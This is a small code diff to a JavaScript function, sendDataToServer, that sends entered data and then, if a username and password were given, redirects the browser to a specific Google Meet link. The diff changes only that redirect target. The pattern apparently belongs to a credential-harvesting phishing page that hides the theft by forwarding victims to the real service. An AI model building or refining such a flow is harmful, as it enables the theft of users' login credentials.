@@ -20,5 +20,5 @@ async function sendDataToServer(){
     })
 
     const result = await res
-    if(username!="" && password !="") window.location.href = "https://meet.google.com/"
+    if(username!="" && password !="") window.location.href = "https://meet.google.com/ubp-hhew-vik"
 }
